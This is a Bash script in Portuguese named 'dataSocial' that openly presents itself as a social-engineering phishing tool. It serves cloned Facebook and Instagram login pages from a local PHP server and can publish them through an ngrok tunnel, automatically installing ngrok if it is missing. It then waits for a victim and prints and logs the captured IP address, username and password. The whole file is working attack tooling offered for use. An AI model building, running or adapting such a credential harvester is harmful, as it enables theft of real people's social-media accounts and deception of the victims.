#!/usr/bin/env bash
# dataSocial - Pesca dados de redes sociais através de páginas sociais modificadas usando a técnica phishing de engenharia social
#
# Site		: https://programadorboard.epizy.com/autor
# Autor		: Oliver Silva <programadorboard@gmail.com>
# Manutênção 	: Oliver Silva <programadorboard@gmail.com>
#
# -------------------------------
# Este programa captura dados de redes sociais através de páginas sociais modificadas utilizando a técnica phishing de engenharia social.
#
# Exemplo:
# $ ./dataSocial --service facebook --listen --tunnel ngrok
#  [+] Dados para enviar a vítima:
#  [+] Localhost: localhost:5555
#  [+] Ngrok addr: http://localhost:5555
#  [+] Ngrok public: https://8bed-191-96-225-179.sa.ngrok.io
#  [*] Escultando conexão...
#  [-] Conexão aberta: 191.96.225.179
#  [-] Credenciais capturadas:
#  [-] Usuário: root@yahoo.com
#  [-] Senha: toor
#  [?] Digite 'ctr+C' OU 'quit' para cancelar
#  ^C
#  Programa interrompido!
#
# Histórico:
# 
# v0.1 2022-11-28, Oliver Silva;
#     Adicionado suporte para facebook e instagram
# v0.2 2023-01-05, Oliver Silva:
#     Adicionado o comando JQ no lugar do GREP
# v0.3 2023-01-07, Oliver Silva:
#     Adicionado instalador Ngrok
#
# Licença: MIT License
#
# Versão 0.1: Gera páginas somente facebook e instagram
# Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
# Versão 0.3: Instalador Ngrok
#


host="localhost"
port="5555"

serviceKey=0
listenKey=0
tunnelKey=0

verifyProot() {
    proot=$(ps -e | grep -Eo "proot")

    if [ -z "$proot" ] ; then
	echo "[!] Execute este programa em uma shell proot!"
	interrupt
    fi
}

verifyLinks() {
    if [ "$1" == "null" -a "$2" == "null" ] ; then
	echo -e "\e[31;1m[!] Links Ngrok nulos, execute este programa em outro tipo de shell proot ou execute este programa novamente\e[0m"
    fi
}

interrupt() {
    echo -e "\nPrograma interrompido!\n"
    processKill
    removeFiles
    exit 0
}

listen() {

    if  [ -n "$tunnel" -a "$tunnel" == "ngrok" ] ; then
	functionGroup

    else
	functionGroup

    fi
}

functionGroup() {
    verifyProot
    removeFiles
    copyFiles
    processKill
    listenLocalhost
    banner
    echo -e "\e[32m[+] Dados para enviar a vítima:\e[0m"
    showLink
}

listenLocalhost() {
    php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
    sleep 3
}

removeFiles() {
    [ -d ./www ] && rm ./www -rf
}

copyFiles() {
    [ ! -d ./www ] && mkdir ./www

    if [ -d websites/${service} ] ; then
	cp -rf websites/${service}/* ./www

    else
	echo "[!] Este serviço não está disponível!"
	exit 1
    fi
}

tunnel() {

    if [ "$tunnel" == "ngrok" ] ; then
	installNgrokIfNotExists
        verifyProot
        ngrok http $port --log=stdout > /dev/null 2>&1 &
        sleep 3
        showLinkNgrok

    else
        echo "[!] Este tunnel não está disponível"
	exit 1
    fi
}


processKill() {
    [ $(ps -e | grep -Eo "php") ] && pkill php
    [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
}

showLink() {
   trap interrupt SIGINT SIGTSTP

   echo -e "\e[32m[+] Localhost: \e[33;1m$host:$port\e[0m"
}

showLinkNgrok() {
    trap interrupt SIGINT SIGTSTP

    addr=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].config.addr")
    public=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].public_url")
 
    verifyLinks $addr $public

    echo -e "\e[32m[+] Ngrok localhost: \e[33;1m$addr\e[0m"
    echo -e "\e[32m[+] Ngrok URL: \e[33;1m$public\e[0m"

}
getDataCaptured() {
    get_ip
    get_data

    until [ "$REPLY" == "quit" ] ; do
        echo -e "\e[32m[?] Digite '\e[33;1mctr+C\e[32m' OU '\e[33;1mquit\e[32m' para cancelar";read
    done
    interrupt
}

get_ip() {
    if [ -f ./www/ip.txt ] ; then
	ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
	printf "\r\e[32m[-] Conexão aberta: \e[33;1m$ip\e[0m\n"

    else
	printf "\r\e[32m[*] Escultando conexão...\e[0m"
	get_ip
    fi
}

get_data() {
    if [ -f ./www/src/dados.txt ] ; then
        [ ! -d ./logs ] && mkdir logs
	cat ./www/src/dados.txt > ./logs/dataSocial.txt
	
	printf "\r\e[32m[-] Credenciais capturadas:\e[0m\n"
	printf "\r\e[32m[+] Seu log está em \e[32;1mlogs/dataSocial.txt\e[0m\n"
	usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
	senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)

	echo -e "\e[32m[-] Usuário: \e[34;1m$usuario\e[0m"
	echo -e "\e[32m[-] Senha: \e[34;1m$senha\e[0m"

    else
	printf "\r\e[32m[*] Aguardando credenciais...\e[0m"
	get_data
    fi
}

banner() {
echo -e "\e[34m
	        '  
              '   '  TIOOLIVER | t.me/tiooliver_sh
            '       '   youtube.com/@tioolive - BRAZIL
        . ' .    '    '                       '
     ' 		    '	                   '   '
  █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
  █▄▀ █▀█ ░█░ █▀█   ▄█ █▄█ █▄▄ █ █▀█ █▄▄ 
  .			     ..'.    ' .
    '  .    		   .     '       '
          ' .  .  .  .  . '.    .'         '  '
	     '         '    '. '              .
	       '       '      '
	         ' .  '   Site: programadorboard.epizy.com 
\e[0m"
}

helper() {
    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-L, --list\tLista todos os serviços sociais disponíveis\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\ni\t-t, --tunnel\tTunela a conexão localhost\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
    exit 1
}

version() {
    echo -ne "$(basename "$0")"
    grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
    exit 1
}

list() {
    services=("facebook" "instagram")

    for service in ${services[@]} ; do
	echo "√ $service"
    done
    exit 0
}

installNgrokIfNotExists() {
    arch=$(dpkg --print-architecture)

    if [ ! -f $PREFIX/bin/ngrok ] ; then
	printf "\r\e[33;1m[*] Instalando Ngrok...\e[0m"
	
	curl -LO https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz > /dev/null 2>&1 &
	
	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
	    printf "\r\e[33;1m[*] Instalando Ngrok..."
	done
	printf "\r\e[33;1m[+] Instalando Ngrok...\e[32;1mOK\e[0m\n"
	while [ ! -f $PREFIX/bin/ngrok ] ; do
	    printf "\r\e[33;1m[*] Extraindo Ngrok...\e[0m"
	    tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C $PREFIX/bin > /dev/null
        done
	printf "\r\e[33;1m[+] Extraindo Ngrok...\e[32;1mOK\e[0m\n"
	rm ngrok-v3-stable-linux-${arch}.tgz
    fi
}

if [ -z "$1" ] ; then
    banner
    echo "[!] tente -h, --help para ajuda"
    exit 1
fi

while [ -n "$1" ] ; do
    case "$1" in
	-h|--help) helper;;
	-v|--version) version;;
	-L|--list) list;;
	-s|--service)
	    shift

	    if [ -z "$1" ] ; then
		echo "[!] Faltou expecificar a rede social"
		exit 1
	    fi
	
	    serviceKey=1
	    service="$1";;

	-l|--listen) listenKey=1;;
	-t|--tunnel)
	    shift
	
	    if [ -z "$1" ] ; then
		echo "[!] Faltou expecificar o tunnel"
		exit 1
	    fi
	    
	    tunnelKey=1
	    tunnel="$1"
	    ;;

	*)
	    echo "Opção inválida!" && exit 1;;
    esac
    shift
done

if [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
    listen && getDataCaptured

elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
    listen && tunnel && getDataCaptured

else
    echo -e "[!] Erro ao processar o comando, -h, --help para mais detalhes"
    exit 1
fi
